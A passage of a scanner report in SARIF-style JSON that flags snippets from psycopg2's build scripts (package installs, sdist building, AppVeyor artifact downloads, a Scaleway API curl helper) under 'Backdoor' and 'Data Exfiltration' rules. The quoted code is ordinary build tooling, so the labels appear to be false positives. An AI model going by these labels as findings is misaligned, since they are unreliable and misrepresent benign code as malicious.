                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 7,
                  "endLine": 32,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\ncase \"$ID\" in\n    centos)\n        yum update -y\n        yum install -y zlib-devel krb5-devel pam-devel\n        ;;\n\n",
                    "rendered": {
                      "text": "\ncase \"$ID\" in\n    centos)\n        yum update -y\n        yum install -y zlib-devel krb5-devel pam-devel\n        ;;\n\n",
                      "markdown": "`\ncase \"$ID\" in\n    centos)\n        yum update -y\n        yum install -y zlib-devel krb5-devel pam-devel\n        ;;\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_sdist.sh"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 18,
                  "endLine": 24,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# Build the source package\npython setup.py sdist -d \"$distdir\"\n\n# install and test\npip install \"${distdir}\"/*.tar.gz\n\npython -c \"import tests; tests.unittest.main(defaultTest='tests.test_suite')\"\n",
                    "rendered": {
                      "text": "# Build the source package\npython setup.py sdist -d \"$distdir\"\n\n# install and test\npip install \"${distdir}\"/*.tar.gz\n\npython -c \"import tests; tests.unittest.main(defaultTest='tests.test_suite')\"\n",
                      "markdown": "`# Build the source package\npython setup.py sdist -d \"$distdir\"\n\n# install and test\npip install \"${distdir}\"/*.tar.gz\n\npython -c \"import tests; tests.unittest.main(defaultTest='tests.test_suite')\"\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_sdist.sh"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 3,
                  "endLine": 16,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\n# Replace the package name\nif [[ \"${PACKAGE_NAME:-}\" ]]; then\n    sed -i \"s/^setup(name=\\\"psycopg2\\\"/setup(name=\\\"${PACKAGE_NAME}\\\"/\" \\\n        \"${prjdir}/setup.py\"\nfi\n\n",
                    "rendered": {
                      "text": "\n# Replace the package name\nif [[ \"${PACKAGE_NAME:-}\" ]]; then\n    sed -i \"s/^setup(name=\\\"psycopg2\\\"/setup(name=\\\"${PACKAGE_NAME}\\\"/\" \\\n        \"${prjdir}/setup.py\"\nfi\n\n",
                      "markdown": "`\n# Replace the package name\nif [[ \"${PACKAGE_NAME:-}\" ]]; then\n    sed -i \"s/^setup(name=\\\"psycopg2\\\"/setup(name=\\\"${PACKAGE_NAME}\\\"/\" \\\n        \"${prjdir}/setup.py\"\nfi\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_sdist.sh"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 36,
                  "endLine": 11,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n# Find psycopg version\nversion=$(grep -e ^PSYCOPG_VERSION setup.py | sed \"s/.*'\\(.*\\)'/\\1/\")\n# A gratuitous comment to fix broken vim syntax file: '\")\ndistdir=\"${prjdir}/dist\"\n\n# Replace the package name\n",
                    "rendered": {
                      "text": "\n# Find psycopg version\nversion=$(grep -e ^PSYCOPG_VERSION setup.py | sed \"s/.*'\\(.*\\)'/\\1/\")\n# A gratuitous comment to fix broken vim syntax file: '\")\ndistdir=\"${prjdir}/dist\"\n\n# Replace the package name\n",
                      "markdown": "`\n# Find psycopg version\nversion=$(grep -e ^PSYCOPG_VERSION setup.py | sed \"s/.*'\\(.*\\)'/\\1/\")\n# A gratuitous comment to fix broken vim syntax file: '\")\ndistdir=\"${prjdir}/dist\"\n\n# Replace the package name\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_sdist.sh"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 45,
                  "endLine": 10,
                  "endColumn": 50,
                  "snippet": {
                    "text": "prjdir=\"$( cd \"${dir}/../..\" && pwd )\"\n\n# Find psycopg version\nversion=$(grep -e ^PSYCOPG_VERSION setup.py | sed \"s/.*'\\(.*\\)'/\\1/\")\n# A gratuitous comment to fix broken vim syntax file: '\")\ndistdir=\"${prjdir}/dist\"\n\n",
                    "rendered": {
                      "text": "prjdir=\"$( cd \"${dir}/../..\" && pwd )\"\n\n# Find psycopg version\nversion=$(grep -e ^PSYCOPG_VERSION setup.py | sed \"s/.*'\\(.*\\)'/\\1/\")\n# A gratuitous comment to fix broken vim syntax file: '\")\ndistdir=\"${prjdir}/dist\"\n\n",
                      "markdown": "`prjdir=\"$( cd \"${dir}/../..\" && pwd )\"\n\n# Find psycopg version\nversion=$(grep -e ^PSYCOPG_VERSION setup.py | sed \"s/.*'\\(.*\\)'/\\1/\")\n# A gratuitous comment to fix broken vim syntax file: '\")\ndistdir=\"${prjdir}/dist\"\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_sdist.sh"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 1,
                  "endLine": 9,
                  "endColumn": 7,
                  "snippet": {
                    "text": "dir=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\"\nprjdir=\"$( cd \"${dir}/../..\" && pwd )\"\n\n# Find psycopg version\nversion=$(grep -e ^PSYCOPG_VERSION setup.py | sed \"s/.*'\\(.*\\)'/\\1/\")\n# A gratuitous comment to fix broken vim syntax file: '\")\ndistdir=\"${prjdir}/dist\"\n",
                    "rendered": {
                      "text": "dir=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\"\nprjdir=\"$( cd \"${dir}/../..\" && pwd )\"\n\n# Find psycopg version\nversion=$(grep -e ^PSYCOPG_VERSION setup.py | sed \"s/.*'\\(.*\\)'/\\1/\")\n# A gratuitous comment to fix broken vim syntax file: '\")\ndistdir=\"${prjdir}/dist\"\n",
                      "markdown": "`dir=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\"\nprjdir=\"$( cd \"${dir}/../..\" && pwd )\"\n\n# Find psycopg version\nversion=$(grep -e ^PSYCOPG_VERSION setup.py | sed \"s/.*'\\(.*\\)'/\\1/\")\n# A gratuitous comment to fix broken vim syntax file: '\")\ndistdir=\"${prjdir}/dist\"\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/download_packages_appveyor.py"
                },
                "region": {
                  "startLine": 74,
                  "startColumn": 20,
                  "endLine": 74,
                  "endColumn": 25,
                  "snippet": {
                    "text": "                fn = fn.split(\"/\", 1)[1]\n            dest = Path(\"wheelhouse\") / fn\n            logger.info(f\"downloading {dest}\")\n            resp = s.get(\n                f\"{API_URL}/buildjobs/{job['jobId']}/artifacts/{af['fileName']}\"\n            )\n            resp.raise_for_status()\n",
                    "rendered": {
                      "text": "                fn = fn.split(\"/\", 1)[1]\n            dest = Path(\"wheelhouse\") / fn\n            logger.info(f\"downloading {dest}\")\n            resp = s.get(\n                f\"{API_URL}/buildjobs/{job['jobId']}/artifacts/{af['fileName']}\"\n            )\n            resp.raise_for_status()\n",
                      "markdown": "`                fn = fn.split(\"/\", 1)[1]\n            dest = Path(\"wheelhouse\") / fn\n            logger.info(f\"downloading {dest}\")\n            resp = s.get(\n                f\"{API_URL}/buildjobs/{job['jobId']}/artifacts/{af['fileName']}\"\n            )\n            resp.raise_for_status()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/download_packages_appveyor.py"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 16,
                  "endLine": 65,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            raise ScriptError(f\"status for job {job['jobId']} is {job['status']}\")\n\n        logger.info(f\"fetching artifacts info for {job['name']}\")\n        resp = s.get(f\"{API_URL}/buildjobs/{job['jobId']}/artifacts/\")\n        resp.raise_for_status()\n        afs = resp.json()\n        for af in afs:\n",
                    "rendered": {
                      "text": "            raise ScriptError(f\"status for job {job['jobId']} is {job['status']}\")\n\n        logger.info(f\"fetching artifacts info for {job['name']}\")\n        resp = s.get(f\"{API_URL}/buildjobs/{job['jobId']}/artifacts/\")\n        resp.raise_for_status()\n        afs = resp.json()\n        for af in afs:\n",
                      "markdown": "`            raise ScriptError(f\"status for job {job['jobId']} is {job['status']}\")\n\n        logger.info(f\"fetching artifacts info for {job['name']}\")\n        resp = s.get(f\"{API_URL}/buildjobs/{job['jobId']}/artifacts/\")\n        resp.raise_for_status()\n        afs = resp.json()\n        for af in afs:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/download_packages_appveyor.py"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 16,
                  "endLine": 43,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        resp = s.get(f\"{API_URL}/projects/{REPOS}/build/{opt.build}\")\n    else:\n        logger.info(\"fetching last run\")\n        resp = s.get(f\"{API_URL}/projects/{REPOS}\")\n\n    resp.raise_for_status()\n    data = resp.json()\n",
                    "rendered": {
                      "text": "        resp = s.get(f\"{API_URL}/projects/{REPOS}/build/{opt.build}\")\n    else:\n        logger.info(\"fetching last run\")\n        resp = s.get(f\"{API_URL}/projects/{REPOS}\")\n\n    resp.raise_for_status()\n    data = resp.json()\n",
                      "markdown": "`        resp = s.get(f\"{API_URL}/projects/{REPOS}/build/{opt.build}\")\n    else:\n        logger.info(\"fetching last run\")\n        resp = s.get(f\"{API_URL}/projects/{REPOS}\")\n\n    resp.raise_for_status()\n    data = resp.json()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/download_packages_appveyor.py"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 16,
                  "endLine": 40,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n    if opt.build:\n        logger.info(\"fetching build %s\", opt.build)\n        resp = s.get(f\"{API_URL}/projects/{REPOS}/build/{opt.build}\")\n    else:\n        logger.info(\"fetching last run\")\n        resp = s.get(f\"{API_URL}/projects/{REPOS}\")\n",
                    "rendered": {
                      "text": "\n    if opt.build:\n        logger.info(\"fetching build %s\", opt.build)\n        resp = s.get(f\"{API_URL}/projects/{REPOS}/build/{opt.build}\")\n    else:\n        logger.info(\"fetching last run\")\n        resp = s.get(f\"{API_URL}/projects/{REPOS}\")\n",
                      "markdown": "`\n    if opt.build:\n        logger.info(\"fetching build %s\", opt.build)\n        resp = s.get(f\"{API_URL}/projects/{REPOS}/build/{opt.build}\")\n    else:\n        logger.info(\"fetching last run\")\n        resp = s.get(f\"{API_URL}/projects/{REPOS}\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/scaleway_m1.sh"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 7,
                  "endLine": 85,
                  "snippet": {
                    "text": "    if [ -t 1 ]; then\n        jq .\n    else\n        cat\n    fi\n}\n\ncmd=${1:-list}\n",
                    "rendered": {
                      "text": "    if [ -t 1 ]; then\n        jq .\n    else\n        cat\n    fi\n}\n\ncmd=${1:-list}\n",
                      "markdown": "`    if [ -t 1 ]; then\n        jq .\n    else\n        cat\n    fi\n}\n\ncmd=${1:-list}\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/scaleway_m1.sh"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 3,
                  "endLine": 53,
                  "endColumn": 9,
                  "snippet": {
                    "text": "function req {\n    method=$1\n    shift\n    curl -sSL --fail-with-body -X $method \\\n        -H \"Content-Type: application/json\" \\\n        -H \"X-Auth-Token: ${SCW_SECRET_KEY}\" \\\n        \"$@\"\n",
                    "rendered": {
                      "text": "function req {\n    method=$1\n    shift\n    curl -sSL --fail-with-body -X $method \\\n        -H \"Content-Type: application/json\" \\\n        -H \"X-Auth-Token: ${SCW_SECRET_KEY}\" \\\n        \"$@\"\n",
                      "markdown": "`function req {\n    method=$1\n    shift\n    curl -sSL --fail-with-body -X $method \\\n        -H \"Content-Type: application/json\" \\\n        -H \"X-Auth-Token: ${SCW_SECRET_KEY}\" \\\n        \"$@\"\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/scaleway_m1.sh"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 42,
                  "endLine": 10,
                  "endColumn": 47,
                  "snippet": {
                    "text": "#   Get data about currently provisioned M1 server on Scaleway. If needed,\n#   provision one.\n#\n#   The script requires the SCW_SECRET_KEY env var set to a valid secret.\n#\n#   If successful, return the response data on stdout. It may look like:\n#\n",
                    "rendered": {
                      "text": "#   Get data about currently provisioned M1 server on Scaleway. If needed,\n#   provision one.\n#\n#   The script requires the SCW_SECRET_KEY env var set to a valid secret.\n#\n#   If successful, return the response data on stdout. It may look like:\n#\n",
                      "markdown": "`#   Get data about currently provisioned M1 server on Scaleway. If needed,\n#   provision one.\n#\n#   The script requires the SCW_SECRET_KEY env var set to a valid secret.\n#\n#   If successful, return the response data on stdout. It may look like:\n#\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/scaleway_m1.sh"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 7,
                  "endLine": 10,
                  "endColumn": 15,
                  "snippet": {
                    "text": "#   Get data about currently provisioned M1 server on Scaleway. If needed,\n#   provision one.\n#\n#   The script requires the SCW_SECRET_KEY env var set to a valid secret.\n#\n#   If successful, return the response data on stdout. It may look like:\n#\n",
                    "rendered": {
                      "text": "#   Get data about currently provisioned M1 server on Scaleway. If needed,\n#   provision one.\n#\n#   The script requires the SCW_SECRET_KEY env var set to a valid secret.\n#\n#   If successful, return the response data on stdout. It may look like:\n#\n",
                      "markdown": "`#   Get data about currently provisioned M1 server on Scaleway. If needed,\n#   provision one.\n#\n#   The script requires the SCW_SECRET_KEY env var set to a valid secret.\n#\n#   If successful, return the response data on stdout. It may look like:\n#\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/scaleway_m1.sh"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 32,
                  "endLine": 55,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    shift\n    curl -sSL --fail-with-body -X $method \\\n        -H \"Content-Type: application/json\" \\\n        -H \"X-Auth-Token: ${SCW_SECRET_KEY}\" \\\n        \"$@\"\n}\nfunction get {\n",
                    "rendered": {
                      "text": "    shift\n    curl -sSL --fail-with-body -X $method \\\n        -H \"Content-Type: application/json\" \\\n        -H \"X-Auth-Token: ${SCW_SECRET_KEY}\" \\\n        \"$@\"\n}\nfunction get {\n",
                      "markdown": "`    shift\n    curl -sSL --fail-with-body -X $method \\\n        -H \"Content-Type: application/json\" \\\n        -H \"X-Auth-Token: ${SCW_SECRET_KEY}\" \\\n        \"$@\"\n}\nfunction get {\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/scaleway_m1.sh"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 28,
                  "endLine": 21,
                  "endColumn": 36,
                  "snippet": {
                    "text": "#      \"project_id\": \"4cf7a85e-f21e-40d4-b758-21d1f4ad3dfb\",\n#      \"organization_id\": \"4cf7a85e-f21e-40d4-b758-21d1f4ad3dfb\",\n#      \"ip\": \"1.2.3.4\",\n#      \"vnc_url\": \"vnc://m1:PASSWORD@1.2.3.4:5900\",\n#      \"status\": \"starting\",\n#      \"created_at\": \"2023-09-22T18:00:18.754646Z\",\n#      \"updated_at\": \"2023-09-22T18:00:18.754646Z\",\n",
                    "rendered": {
                      "text": "#      \"project_id\": \"4cf7a85e-f21e-40d4-b758-21d1f4ad3dfb\",\n#      \"organization_id\": \"4cf7a85e-f21e-40d4-b758-21d1f4ad3dfb\",\n#      \"ip\": \"1.2.3.4\",\n#      \"vnc_url\": \"vnc://m1:PASSWORD@1.2.3.4:5900\",\n#      \"status\": \"starting\",\n#      \"created_at\": \"2023-09-22T18:00:18.754646Z\",\n#      \"updated_at\": \"2023-09-22T18:00:18.754646Z\",\n",
                      "markdown": "`#      \"project_id\": \"4cf7a85e-f21e-40d4-b758-21d1f4ad3dfb\",\n#      \"organization_id\": \"4cf7a85e-f21e-40d4-b758-21d1f4ad3dfb\",\n#      \"ip\": \"1.2.3.4\",\n#      \"vnc_url\": \"vnc://m1:PASSWORD@1.2.3.4:5900\",\n#      \"status\": \"starting\",\n#      \"created_at\": \"2023-09-22T18:00:18.754646Z\",\n#      \"updated_at\": \"2023-09-22T18:00:18.754646Z\",\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/scaleway_m1.sh"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 32,
                  "endLine": 10,
                  "endColumn": 42,
                  "snippet": {
                    "text": "#   Get data about currently provisioned M1 server on Scaleway. If needed,\n#   provision one.\n#\n#   The script requires the SCW_SECRET_KEY env var set to a valid secret.\n#\n#   If successful, return the response data on stdout. It may look like:\n#\n",
                    "rendered": {
                      "text": "#   Get data about currently provisioned M1 server on Scaleway. If needed,\n#   provision one.\n#\n#   The script requires the SCW_SECRET_KEY env var set to a valid secret.\n#\n#   If successful, return the response data on stdout. It may look like:\n#\n",
                      "markdown": "`#   Get data about currently provisioned M1 server on Scaleway. If needed,\n#   provision one.\n#\n#   The script requires the SCW_SECRET_KEY env var set to a valid secret.\n#\n#   If successful, return the response data on stdout. It may look like:\n#\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_macos_before_all.sh"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 18,
                  "endLine": 26,
                  "endColumn": 27,
                  "snippet": {
                    "text": "      echo \"PostgreSQL service not ready, giving up\"\n      exit 1\n  fi\n  echo \"PostgreSQL service not ready, waiting a bit, attempts left: $i\"\n  sleep 5\ndone\n\n",
                    "rendered": {
                      "text": "      echo \"PostgreSQL service not ready, giving up\"\n      exit 1\n  fi\n  echo \"PostgreSQL service not ready, waiting a bit, attempts left: $i\"\n  sleep 5\ndone\n\n",
                      "markdown": "`      echo \"PostgreSQL service not ready, giving up\"\n      exit 1\n  fi\n  echo \"PostgreSQL service not ready, waiting a bit, attempts left: $i\"\n  sleep 5\ndone\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_macos_before_all.sh"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 22,
                  "endLine": 23,
                  "endColumn": 31,
                  "snippet": {
                    "text": "for i in $(seq 10 -1 0); do\n  eval pg_isready && break\n  if [ $i == 0 ]; then\n      echo \"PostgreSQL service not ready, giving up\"\n      exit 1\n  fi\n  echo \"PostgreSQL service not ready, waiting a bit, attempts left: $i\"\n",
                    "rendered": {
                      "text": "for i in $(seq 10 -1 0); do\n  eval pg_isready && break\n  if [ $i == 0 ]; then\n      echo \"PostgreSQL service not ready, giving up\"\n      exit 1\n  fi\n  echo \"PostgreSQL service not ready, waiting a bit, attempts left: $i\"\n",
                      "markdown": "`for i in $(seq 10 -1 0); do\n  eval pg_isready && break\n  if [ $i == 0 ]; then\n      echo \"PostgreSQL service not ready, giving up\"\n      exit 1\n  fi\n  echo \"PostgreSQL service not ready, waiting a bit, attempts left: $i\"\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_macos_before_all.sh"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 16,
                  "endLine": 6,
                  "endColumn": 21,
                  "snippet": {
                    "text": "# Configure the environment needed to build wheel packages on Mac OS.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_MACOS\n#\n# The PG_VERSION env var must be set to a Postgres major version (e.g. 16).\n\nset -euo pipefail\nset -x\n",
                    "rendered": {
                      "text": "# Configure the environment needed to build wheel packages on Mac OS.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_MACOS\n#\n# The PG_VERSION env var must be set to a Postgres major version (e.g. 16).\n\nset -euo pipefail\nset -x\n",
                      "markdown": "`# Configure the environment needed to build wheel packages on Mac OS.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_MACOS\n#\n# The PG_VERSION env var must be set to a Postgres major version (e.g. 16).\n\nset -euo pipefail\nset -x\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_macos_before_all.sh"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 6,
                  "endLine": 4,
                  "endColumn": 14,
                  "snippet": {
                    "text": "#!/bin/bash\n\n# Configure the environment needed to build wheel packages on Mac OS.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_MACOS\n#\n# The PG_VERSION env var must be set to a Postgres major version (e.g. 16).\n\n",
                    "rendered": {
                      "text": "#!/bin/bash\n\n# Configure the environment needed to build wheel packages on Mac OS.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_MACOS\n#\n# The PG_VERSION env var must be set to a Postgres major version (e.g. 16).\n\n",
                      "markdown": "`#!/bin/bash\n\n# Configure the environment needed to build wheel packages on Mac OS.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_MACOS\n#\n# The PG_VERSION env var must be set to a Postgres major version (e.g. 16).\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_macos_before_all.sh"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 17,
                  "endLine": 6,
                  "endColumn": 46,
                  "snippet": {
                    "text": "# Configure the environment needed to build wheel packages on Mac OS.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_MACOS\n#\n# The PG_VERSION env var must be set to a Postgres major version (e.g. 16).\n\nset -euo pipefail\nset -x\n",
                    "rendered": {
                      "text": "# Configure the environment needed to build wheel packages on Mac OS.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_MACOS\n#\n# The PG_VERSION env var must be set to a Postgres major version (e.g. 16).\n\nset -euo pipefail\nset -x\n",
                      "markdown": "`# Configure the environment needed to build wheel packages on Mac OS.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_MACOS\n#\n# The PG_VERSION env var must be set to a Postgres major version (e.g. 16).\n\nset -euo pipefail\nset -x\n`"
                    }
                  },
